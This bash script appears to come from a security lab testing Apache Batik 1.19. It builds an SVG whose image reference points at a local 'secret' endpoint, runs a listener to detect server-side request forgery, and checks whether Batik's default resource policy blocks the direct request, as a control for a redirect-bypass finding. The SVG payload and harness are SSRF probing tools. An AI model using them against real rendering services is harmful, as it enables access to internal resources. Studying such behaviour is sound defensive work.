#!/usr/bin/env bash
# NEGATIVE CONTROL for F-1: prove DefaultExternalResourceSecurity actually BLOCKS a direct
# cross-host reference. Same doc host 127.0.0.1, but resource references http://localhost:9999/secret
# DIRECTLY (no redirect). Expected: NO_HIT (policy blocks it). If NO_HIT here but HIT in the redirect
# test => the same-host policy IS active and the redirect is what bypasses it (differential proven).
set -uo pipefail
W=/tmp/batik-lab; cd "$W"
CP=$(printf '%s' "$W/batik-1.19/lib/*")

cat > ssrf_direct.svg <<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20">
  <image x="0" y="0" width="20" height="20" xlink:href="http://localhost:9999/secret"/>
</svg>
SVG

cat > server_ctl.py <<'PY'
import http.server, threading, socketserver, time
HIT={"secret":False}
class Secret(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/secret"):
            HIT["secret"]=True; print("SSRF_HIT /secret",flush=True)
            png=bytes.fromhex("89504e470d0a1a0a0000000d494844520000000100000001080600000001f15c4890000000a49444154789c6360000000020001e221bc330000000049454e44ae426082")
            self.send_response(200); self.send_header("Content-Type","image/png")
            self.send_header("Content-Length",str(len(png))); self.end_headers()
            try:self.wfile.write(png)
            except:pass
        else:
            self.send_response(404); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
def serve():
    with socketserver.TCPServer(("127.0.0.1",9999),Secret) as s: s.serve_forever()
threading.Thread(target=serve,daemon=True).start()
for _ in range(30):
    time.sleep(0.5)
    if HIT["secret"]:
        print("CONTROL_RESULT: HIT (policy did NOT block direct cross-host -> would weaken F-1)",flush=True); break
else:
    print("CONTROL_RESULT: NO_HIT (policy blocked direct cross-host reference -> F-1 differential PROVEN)",flush=True)
PY

python3 server_ctl.py > /tmp/batik-lab/ssrf_ctl.result 2>&1 &
SRV=$!; sleep 1.2
echo "=== run BatikProbe DIRECT localhost ref (docURI=http://127.0.0.1:8000/doc.svg, DEFAULT security) ==="
timeout 40 java -cp "$CP:." BatikProbe /tmp/batik-lab/ssrf_direct.svg http://127.0.0.1:8000/doc.svg false 2>&1 | grep -E "TRANSCODE|Security|Exception" | head -6
sleep 2.5
echo "=== control result ==="; cat /tmp/batik-lab/ssrf_ctl.result 2>/dev/null | tail -3
kill $SRV 2>/dev/null; echo "=== DONE ==="
